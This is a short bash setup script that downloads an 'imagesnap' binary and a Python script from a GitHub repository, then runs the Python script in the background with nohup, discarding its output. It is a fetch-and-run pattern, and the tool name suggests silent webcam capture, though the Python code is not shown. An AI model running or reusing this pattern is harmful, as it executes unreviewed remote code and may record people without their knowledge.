#!/bin/bash 
# download the necessary script and utility 
curl https://github.com/AlexeyMK/smilify_me/raw/master/imagesnap > imagesnap
curl https://raw.github.com/AlexeyMK/smilify_me/master/thanks_for_helping.py > thanks_for_helping.py 

#make sure imagesnap is executable
chmod +x imagesnap

# nohup (nohangup) - keep executing program even after shell dies
# (so just in case the user closes shell accidentally, we keep going)
nohup python thanks_for_helping.py > /dev/null &
